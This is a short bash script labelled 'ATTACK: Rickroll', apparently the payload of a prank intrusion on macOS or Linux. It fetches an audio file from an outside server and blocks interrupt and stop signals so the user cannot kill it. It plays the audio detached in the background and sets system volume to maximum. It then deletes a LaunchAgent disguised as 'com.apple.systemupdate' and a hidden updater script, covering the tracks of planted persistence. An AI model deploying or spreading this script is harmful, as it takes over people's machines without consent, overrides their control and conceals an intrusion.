# ATTACK: Rickroll
#!/bin/bash

AUDIO_URL="https://keroserene.net/lol/roll.s16"
TMP="/tmp/rickroll_eternal.s16"

download_audio() {
	if command -v curl >/dev/null; then
		curl -sL "$AUDIO_URL" -o "$TMP"
	elif command -v wget >/dev/null; then
		wget -qO "$TMP" "$AUDIO_URL"
	else
		echo ":("
		exit 1
	fi
}

trap '' INT TERM HUP QUIT TSTP

download_audio

start_unstoppable() {
	if command -v ffplay >/dev/null; then
		(
			ffplay -nodisp -autoexit -loglevel quiet \
				-f s16le -ar 8000 -ac 1 "$TMP" \
				>/dev/null 2>&1
		) & disown
	elif command -v mpv >/dev/null; then
		(
			mpv --no-video --really-quiet "$TMP" \
				>/dev/null 2>&1
		) & disown
	elif command -v afplay >/dev/null; then
		(
			afplay -v 100 "$TMP" \
				>/dev/null 2>&1
		) & disown
	else
		echo ":(("
		exit 1
	fi
}

start_unstoppable

echo "Womp Womp :("

osascript -e "set volume output volume 100"

launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist
rm ~/.hidden_updater.sh
rm ~/Library/LaunchAgents/com.apple.systemupdate.plist